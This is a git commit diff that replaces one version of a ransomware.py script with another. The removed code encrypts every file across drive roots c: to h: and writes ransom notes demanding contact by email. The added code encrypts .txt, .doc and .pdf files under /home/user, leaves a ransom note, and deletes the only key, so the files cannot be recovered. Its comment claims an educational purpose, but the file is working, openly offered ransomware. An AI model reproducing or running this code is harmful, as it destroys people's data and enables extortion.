47069e7459547e182e27093e5d16ae0d2b7b25d9
Leon Plis <58827641+Nexxus67@users.noreply.github.com>
2024-07-12 19:46:43 -0300

    Update ransomware.py

--- ransomware.py
+++ ransomware.py
@@ -1,48 +1,72 @@
-import os  # To access file systems  
-import subprocess 
-from cryptography.fernet import Fernet 
+import random
+from pathlib import Path
+from cryptography.fernet import Fernet
+import os
 
-def create_ransomware():   
-    rands = ["C:\Windows\System32"] + [str(i) for i in range (10)]      
-    #Creating a list of folders to be encrypted  
-    encryptedFolders=["c:\\","d:\\","e:\\", "f:\\" ,  "g:\\ ","h:\\" ] #list of folders with path separated by \    
-                        
-    def encrypt_folders(path):   
-        for i in range (10):  
-            if os.path.isdir(os.path.join("c:" + str(i))):      
-                print ("Encrypting Folder: " + path[len('C:\\'):]) #print the encrypted folder name 
-                key = Fernet.generate_key() # Generate a new key for each folder
-                with open(os.path.join(path, "README.txt"), 'w') as f:
-                    f.write("Your files have been encrypted. To decrypt them, send us an email at hackers@example.com and include your key:\n" + str(key))
-                for dirpath, dirnames, filenames in os.walk(path):
-                    for filename in filenames:
-                        with open(os.path.join(dirpath, filename), 'rb') as f:
-                            plaintext = f.read()
-                        cipher = Fernet(key).encrypt(plaintext)
-                        with open(os.path.join(dirpath, filename), 'wb') as f:
-                            f.write(cipher)
-                        
-    for path in encryptedFolders:
-        encrypt_folders(path)
+def generate_key():
+    return Fernet.generate_key()
+
+def load_key():
+    return open("secret.key", "rb").read()
+
+def save_key(key):
+    with open("secret.key", "wb") as key_file:
+        key_file.write(key)
+
+def encrypt_file(file, key):
+    fernet = Fernet(key)
+    with open(file, "rb") as f:
+        data = f.read()
+    encrypted_data = fernet.encrypt(data)
+    with open(file, "wb") as f:
+        f.write(encrypted_data)
+
+def decrypt_file(file, key):
+    fernet = Fernet(key)
+    with open(file, "rb") as f:
+        encrypted_data = f.read()
+    decrypted_data = fernet.decrypt(encrypted_data)
+    with open(file, "wb") as f:
+        f.write(decrypted_data)
+
+def encrypt_directory(folder, key):
+    folder = Path(folder)
+    for file in folder.glob("*"):
+        if file.is_file() and file.suffix in {".txt", ".doc", ".pdf"}:
+            encrypt_file(file, key)
+            print(f"Encrypted {file}")
+
+def decrypt_directory(folder, key):
+    folder = Path(folder)
+    for file in folder.glob("*"):
+        if file.is_file() and file.suffix in {".txt", ".doc", ".pdf"}:
+            decrypt_file(file, key)
+            print(f"Decrypted {file}")
+
+def create_ransom_note():
+    note = """
+    Your files have been encrypted!
+    To decrypt them, you must pay a ransom.
+    Contact example@domain.com for payment instructions.
+    """
+    with open("/home/user/ransom_note.txt", "w") as note_file:
+        note_file.write(note)
+
+def main():
+    # Ensure this path is isolated and used for educational purposes only.
+    folder_path = "/home/user"
+
+    key = generate_key()
+    save_key(key)
+
+    print("Encrypting files...")
+    encrypt_directory(folder_path, key)
     
-    # Create the ransom note 
-    ransom_note() 
-        
-def ransom_note(): 
-    """This function creates the ransom note that will be displayed to victims. It should include a greeting, instructions on how to pay the bitcoin wall and an expiration date for when payment must be made."""  
+    create_ransom_note()
     
-    # Create the text of our ransomware 
-    victim_message = "You have been infected with RANSOMWARE! All your files are encrypted. To decrypt them, please send us an email at hackers@example.com and include your key."
-    
-    # Write the ransom note to the Desktop
-    with open(os.path.join(os.path.expanduser("~"), "Desktop", "RANSOM_NOTE.txt"), 'w') as f:
-        f.write(victim_message)
-    
-    # Open the ransom note for the victim to see
-    subprocess.call(["notepad.exe", os.path.join(os.path.expanduser("~"), "Desktop", "RANSOM_NOTE.txt")])
-                        
-def main():   
-    create_ransomware()
-                        
-if __name__ == '__main__':   
+    # Remove the key to simulate ransom scenario
+    os.remove("secret.key")
+    print("Ransom note created. Key removed. Files encrypted.")
+
+if __name__ == "__main__":
     main()
